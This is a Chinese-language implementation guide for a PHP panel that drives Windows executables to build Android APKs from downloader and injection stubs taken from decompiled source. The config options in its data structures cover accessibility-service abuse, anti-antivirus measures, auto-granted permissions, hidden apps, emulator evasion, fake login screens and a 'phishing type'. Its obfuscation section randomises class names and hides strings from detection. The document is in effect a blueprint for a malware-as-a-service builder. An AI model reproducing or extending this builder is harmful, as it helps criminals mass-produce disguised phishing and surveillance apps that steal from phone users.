# 代码映射和实现指南

## 1. 参数传递流程

### 1.1 PHP → EaodStarter.exe

```
PHP 调用：
exec("EaodStarter.exe lunch " . implode(" ", $params));

参数格式（32个Base64编码）：
"lunch" base64(appid) base64(userid) base64(ClientName) base64(Email) 
base64(MainActivity) base64(appdir) base64(UserHost) base64(use_access) 
base64(use_antkill) base64(use_atoprims) base64(notifytitle) 
base64(notifymsg) base64(allprims) base64(blackprims) base64(Buildtype) 
base64(appname) base64(appversion) base64(appicopath) base64(appurl) 
base64(logintitle) base64(logindis) base64(loginbtn) base64(lngshort) 
base64(hiddenapp) base64(noemulator) base64(installtype) base64(hidetype) 
base64(use_draw) base64(open_access) base64(descr_iption) base64(diao_type)
```

### 1.2 EaodStarter.exe → EaodWorker.exe

```csharp
// Starter.cs 第183-191行
ProcessStartInfo processStartInfo = new ProcessStartInfo();
processStartInfo.FileName = "EaodWorker.exe";
processStartInfo.Arguments = arguments;  // 同样的32个Base64参数
processStartInfo.CreateNoWindow = true;
processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
processStartInfo.UseShellExecute = true;
Process.Start(processStartInfo);
```

---

## 2. 关键数据结构

### 2.1 应用配置对象

```php
class AppConfig {
    public $appid;              // 应用ID
    public $userid;             // 用户ID
    public $ClientName;         // 客户端名称
    public $Email;              // 邮箱（加密）
    public $MainActivity;       // 主Activity
    public $appdir;             // 应用目录
    public $UserHost;           // 用户主机
    public $use_access;         // 使用无障碍服务
    public $use_antkill;        // 防杀软
    public $use_atoprims;       // 自动授权权限
    public $notifytitle;        // 通知标题
    public $notifymsg;          // 通知消息
    public $allprims;           // 所有权限
    public $blackprims;         // 黑名单权限
    public $Buildtype;          // 构建类型 (S/C)
    public $appname;            // 应用名称
    public $appversion;         // 应用版本
    public $appicopath;         // 应用图标路径
    public $appurl;             // 应用URL（加密）
    public $logintitle;         // 登录标题
    public $logindis;           // 登录描述
    public $loginbtn;           // 登录按钮
    public $lngshort;           // 语言代码
    public $hiddenapp;          // 隐藏应用
    public $noemulator;         // 禁用模拟器
    public $installtype;        // 安装类型
    public $hidetype;           // 隐藏类型
    public $use_draw;           // 使用悬浮窗
    public $open_access;        // 开启无障碍
    public $descr_iption;       // 描述
    public $diao_type;          // 钓鱼类型
}
```

### 2.2 构建状态回调

```php
// UpdateState 回调
{
    "userid": "user123",
    "appid": "app456",
    "subcom": "onbuild|finished|failed"
}

// InsertApp 回调（自定义应用）
{
    "userid": "user123",
    "appid": "app456",
    "apppath": "C:\\...\\user\\apps\\user123\\app456\\app456.apk",
    "subcom": "onbuild",
    "appname": "MyApp",
    "appico": "user123/icons/icon.png"
}

// InsertApp 回调（Store应用）
{
    "userid": "user123",
    "appid": "app456",
    "apppath": "C:\\...\\user\\apps\\user123\\app456\\app456.apk",
    "subcom": "onbuild"
}
```

---

## 3. 文件系统映射

### 3.1 目录结构

```
/home/code/php/project/full-package/
├── src/
│   ├── private/
│   │   ├── decompiled/          # 逆向源码
│   │   ├── apkstub/             # APK Stub文件
│   │   │   ├── apkstub.zip      # 完整权限
│   │   │   ├── apkstubg.zip     # 部分权限
│   │   │   ├── dropstub.zip     # 下载器
│   │   │   └── jectstub.zip     # 注入代码
│   │   ├── Eaod90061.php        # 主回调接口
│   │   └── Eaod91370.php        # 自定义应用回调
│   ├── public/
│   │   └── user/
│   │       ├── apps/            # 构建的APK
│   │       │   └── {userid}/
│   │       │       └── {appid}/
│   │       │           └── {appid}.apk
│   │       └── storage/         # 用户存储
│   │           └── {userid}/
│   │               └── icons/
│   │                   └── {icon}.png
│   └── app/
│       ├── Models/
│       ├── Controllers/
│       └── Services/
```

### 3.2 PHP 路径配置

```php
// config/paths.php
define('PRIVATE_DIR', __DIR__ . '/../private');
define('APKSTUB_DIR', PRIVATE_DIR . '/apkstub');
define('USER_APPS_DIR', __DIR__ . '/../public/user/apps');
define('USER_STORAGE_DIR', __DIR__ . '/../public/user/storage');
define('ICONS_DIR', USER_STORAGE_DIR . '/{userid}/icons');

// 文件路径
$apkstub_full = APKSTUB_DIR . '/apkstub.zip';
$apkstub_partial = APKSTUB_DIR . '/apkstubg.zip';
$dropstub = APKSTUB_DIR . '/dropstub.zip';
$injectstub = APKSTUB_DIR . '/jectstub.zip';

$output_apk = USER_APPS_DIR . '/{userid}/{appid}/{appid}.apk';
$icon_path = ICONS_DIR . '/{icon}.png';
```

---

## 4. 加密/解密实现

### 4.1 AES-CBC 加密（PHP）

```php
class Crypter {
    private $iv = "2230209522049090";
    private $password = "4814780584699673";
    private $salt = "2894356330652558";
    
    public function encrypt($raw) {
        $key = hash_pbkdf2('sha1', $this->password, $this->salt, 65536, 16, true);
        $iv = substr($this->iv, 0, 16);
        $encrypted = openssl_encrypt($raw, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
        return base64_encode($encrypted);
    }
    
    public function decrypt($encrypted) {
        $key = hash_pbkdf2('sha1', $this->password, $this->salt, 65536, 16, true);
        $iv = substr($this->iv, 0, 16);
        $decrypted = openssl_decrypt(base64_decode($encrypted), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
        return $decrypted;
    }
}
```

### 4.2 Base64 编码/解码

```php
// 编码参数
$params = [
    base64_encode($appid),
    base64_encode($userid),
    base64_encode($ClientName),
    base64_encode($Email),
    // ... 其他参数
];

// 解码参数
$appid = base64_decode($params[0]);
$userid = base64_decode($params[1]);
// ...
```

---

## 5. HTTP 回调处理

### 5.1 Eaod90061.php - 主回调接口

```php
<?php
// 接收 POST JSON 数据
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// 验证必要字段
if (!isset($data['userid']) || !isset($data['appid']) || !isset($data['subcom'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing required fields']);
    exit;
}

$userid = $data['userid'];
$appid = $data['appid'];
$subcom = $data['subcom'];

// 处理不同的状态
switch ($subcom) {
    case 'onbuild':
        // 应用开始构建
        updateBuildStatus($userid, $appid, 'building');
        break;
        
    case 'finished':
        // 应用构建完成
        updateBuildStatus($userid, $appid, 'completed');
        // 验证APK文件
        $apkPath = getUserAppPath($userid, $appid);
        if (file_exists($apkPath)) {
            // 更新数据库
            markAppAsReady($userid, $appid);
        }
        break;
        
    case 'failed':
        // 应用构建失败
        updateBuildStatus($userid, $appid, 'failed');
        break;
        
    default:
        http_response_code(400);
        echo json_encode(['error' => 'Unknown subcom']);
        exit;
}

echo json_encode(['status' => 'ok']);
?>
```

### 5.2 Eaod91370.php - 自定义应用回调

```php
<?php
// 接收 POST JSON 数据
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// 验证必要字段
if (!isset($data['userid']) || !isset($data['appid'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing required fields']);
    exit;
}

$userid = $data['userid'];
$appid = $data['appid'];
$subcom = $data['subcom'] ?? 'onbuild';

// 处理自定义应用
if ($subcom == 'onbuild') {
    $appname = $data['appname'] ?? 'Unknown';
    $appico = $data['appico'] ?? '';
    $apppath = $data['apppath'] ?? '';
    
    // 更新数据库
    updateCustomApp($userid, $appid, $appname, $appico, $apppath);
}

echo json_encode(['status' => 'ok']);
?>
```

---

## 6. 数据库设计

### 6.1 应用表

```sql
CREATE TABLE apps (
    id INT PRIMARY KEY AUTO_INCREMENT,
    userid VARCHAR(255) NOT NULL,
    appid VARCHAR(255) NOT NULL,
    appname VARCHAR(255),
    appversion VARCHAR(50),
    appurl TEXT,
    buildtype CHAR(1),  -- 'S' 或 'C'
    status VARCHAR(50),  -- 'pending', 'building', 'completed', 'failed'
    apk_path VARCHAR(500),
    icon_path VARCHAR(500),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    UNIQUE KEY unique_app (userid, appid)
);
```

### 6.2 构建日志表

```sql
CREATE TABLE build_logs (
    id INT PRIMARY KEY AUTO_INCREMENT,
    userid VARCHAR(255) NOT NULL,
    appid VARCHAR(255) NOT NULL,
    status VARCHAR(50),  -- 'onbuild', 'finished', 'failed'
    message TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (userid, appid) REFERENCES apps(userid, appid)
);
```

---

## 7. 类名混淆映射

### 7.1 生成随机类名

```php
function generateRandomClassName() {
    $chars = 'qazwsxedcrfvtgbyhnujmikolp';
    $length = rand(8, 15);
    $name = '';
    for ($i = 0; $i < $length; $i++) {
        $name .= $chars[rand(0, strlen($chars) - 1)];
    }
    return ucfirst($name);
}

// 类名映射
$classNameMap = [
    'AccessibilityActivity' => generateRandomClassName(),
    'AccessServices' => generateRandomClassName(),
    'HiddenBrowser' => generateRandomClassName(),
    // ... 50+ 个类名
];
```

### 7.2 字符串混淆映射

```php
$stringObfuscationMap = [
    'URL_PING' => generateRandomString(),
    'URL_MSG' => generateRandomString(),
    'URL_SOCKT' => generateRandomString(),
    // ... 50+ 个字符串
];
```

---

## 8. 工作流程

### 8.1 完整的APK构建流程

```
1. PHP 接收构建请求
   ↓
2. 验证参数和权限
   ↓
3. 生成 32 个 Base64 参数
   ↓
4. 调用 EaodStarter.exe lunch [params]
   ↓
5. EaodStarter 解码参数
   ↓
6. EaodStarter 启动 EaodWorker.exe [params]
   ↓
7. EaodWorker 初始化
   ↓
8. EaodWorker 执行 Step1 (解包)
   ↓
9. EaodWorker 执行 Step2 (注入)
   ↓
10. EaodWorker 执行 Step3 (打包)
    ↓
11. EaodWorker 调用 InsertApp() 回调
    ↓
12. PHP 接收回调，更新数据库
    ↓
13. APK 构建完成
```

### 8.2 状态转换

```
pending → building (UpdateState: onbuild)
         ↓
       finished (UpdateState: finished)
         ↓
       ready (InsertApp: onbuild)

或

pending → building (UpdateState: onbuild)
         ↓
       failed (UpdateState: failed)
```

---

## 9. 错误处理

### 9.1 常见错误

```php
// 参数验证错误
if (count($params) != 32) {
    throw new Exception('Invalid parameter count');
}

// 文件不存在错误
if (!file_exists($apkPath)) {
    throw new Exception('APK file not found');
}

// 权限错误
if (!is_writable($outputDir)) {
    throw new Exception('Output directory not writable');
}

// 加密错误
if (!$encrypted = $crypter->encrypt($data)) {
    throw new Exception('Encryption failed');
}
```

### 9.2 日志记录

```php
class Logger {
    public static function log($userid, $appid, $message) {
        $logFile = LOG_DIR . "/{$userid}_{$appid}.log";
        $timestamp = date('Y-m-d H:i:s');
        file_put_contents($logFile, "[$timestamp] $message\n", FILE_APPEND);
    }
}

// 使用
Logger::log($userid, $appid, 'Build started');
Logger::log($userid, $appid, 'Build completed');
Logger::log($userid, $appid, 'Build failed: ' . $error);
```

---

## 10. 安全考虑

### 10.1 输入验证

```php
// 验证 userid 和 appid
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $userid)) {
    throw new Exception('Invalid userid format');
}

if (!preg_match('/^[a-zA-Z0-9_-]+$/', $appid)) {
    throw new Exception('Invalid appid format');
}

// 验证 Base64 编码
if (!base64_decode($param, true)) {
    throw new Exception('Invalid base64 encoding');
}
```

### 10.2 文件安全

```php
// 防止目录遍历
$safePath = realpath($userPath);
if (strpos($safePath, realpath(USER_APPS_DIR)) !== 0) {
    throw new Exception('Path traversal detected');
}

// 验证文件类型
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $filePath);
if ($mime != 'application/zip') {
    throw new Exception('Invalid file type');
}
```

---

## 11. 性能优化

### 11.1 异步处理

```php
// 使用队列处理构建请求
class BuildQueue {
    public function enqueue($userid, $appid, $config) {
        // 添加到队列
        $this->queue->push([
            'userid' => $userid,
            'appid' => $appid,
            'config' => $config,
            'status' => 'pending'
        ]);
    }
    
    public function process() {
        // 处理队列中的请求
        while ($job = $this->queue->pop()) {
            $this->build($job);
        }
    }
}
```

### 11.2 缓存

```php
// 缓存类名映射
$cache->set("classmap_{$appid}", $classNameMap, 3600);
$classNameMap = $cache->get("classmap_{$appid}");

// 缓存字符串混淆映射
$cache->set("stringmap_{$appid}", $stringObfuscationMap, 3600);
$stringObfuscationMap = $cache->get("stringmap_{$appid}");
```

